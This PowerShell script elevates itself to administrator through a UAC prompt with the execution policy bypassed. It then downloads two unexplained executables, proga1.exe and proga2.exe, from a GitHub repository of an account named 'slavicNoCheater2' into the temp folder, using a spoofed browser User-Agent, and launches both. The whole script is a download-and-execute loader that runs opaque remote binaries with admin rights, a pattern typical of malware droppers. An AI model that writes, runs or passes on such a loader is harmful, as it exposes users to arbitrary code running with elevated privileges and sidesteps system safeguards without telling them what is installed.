Param([switch]$shouldAssumeToBeElevated, [String]$workingDirOverride)

if(-not($PSBoundParameters.ContainsKey('workingDirOverride'))) { 
    $workingDirOverride = (Get-Location).Path 
}

function Test-Admin {
    $currentUser = New-Object Security.Principal.WindowsPrincipal $([Security.Principal.WindowsIdentity]::GetCurrent())
    $currentUser.IsInRole([Security.Principal.WindowsBuiltinRole]::Administrator)
}

if ((Test-Admin) -eq $false) {
    if ($shouldAssumeToBeElevated) {
        Write-Output "Elevation failed"
        exit
    } else {
        Start-Process powershell.exe -Verb RunAs -ArgumentList ('-noprofile -executionpolicy bypass -file "{0}" -shouldAssumeToBeElevated -workingDirOverride "{1}"' -f ($myinvocation.MyCommand.Definition, "$workingDirOverride"))
    }
    exit
}

Set-Location "$workingDirOverride"

Write-Host "=== DOWNLOADING FILES ===" -ForegroundColor Yellow

$temp = $env:TEMP
$downloaded = 0

function Download-File {
    param($url, $dest)
    
    if (Test-Path $dest) { 
        Remove-Item $dest -Force -ErrorAction SilentlyContinue 
    }
    
    try {
        Write-Host "Downloading: $url" -ForegroundColor Gray
        $wc = New-Object System.Net.WebClient
        $wc.Headers.Add("User-Agent", "Mozilla/5.0")
        $wc.DownloadFile($url, $dest)
        $wc.Dispose()
        return $true
    } catch {
        Write-Host "Error: $($_.Exception.Message)" -ForegroundColor Red
        return $false
    }
}

$url1 = "https://github.com/slavicNoCheater2/network/raw/refs/heads/main/proga1.exe"
$dest1 = "$temp\proga1.exe"

Write-Host "[1/2] proga1.exe" -ForegroundColor Cyan
if (Download-File $url1 $dest1) {
    if ((Get-Item $dest1).Length -gt 0) {
        Write-Host "SUCCESS: proga1.exe" -ForegroundColor Green
        $downloaded++
    }
}

$url2 = "https://github.com/slavicNoCheater2/network/raw/refs/heads/main/proga2.exe"
$dest2 = "$temp\proga2.exe"

Write-Host "[2/2] proga2.exe" -ForegroundColor Cyan
if (Download-File $url2 $dest2) {
    if ((Get-Item $dest2).Length -gt 0) {
        Write-Host "SUCCESS: proga2.exe" -ForegroundColor Green
        $downloaded++
    }
} else {
    Write-Host "WARNING: proga2.exe not found, copying from proga1.exe" -ForegroundColor Yellow
    if (Test-Path $dest1) {
        Copy-Item $dest1 $dest2 -Force
        $downloaded++
    }
}

Write-Host ""
Write-Host "=== RUNNING FILES ===" -ForegroundColor Yellow

if (Test-Path $dest1) {
    Write-Host "Starting proga1.exe..." -ForegroundColor Green
    Start-Process -FilePath $dest1 -WindowStyle Normal
}

if (Test-Path $dest2) {
    Start-Sleep -Seconds 1
    Write-Host "Starting proga2.exe..." -ForegroundColor Green
    Start-Process -FilePath $dest2 -WindowStyle Normal
}

Write-Host ""
Write-Host "=== DONE ($downloaded/2) ===" -ForegroundColor Green
Write-Host "Press any key..."
$null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
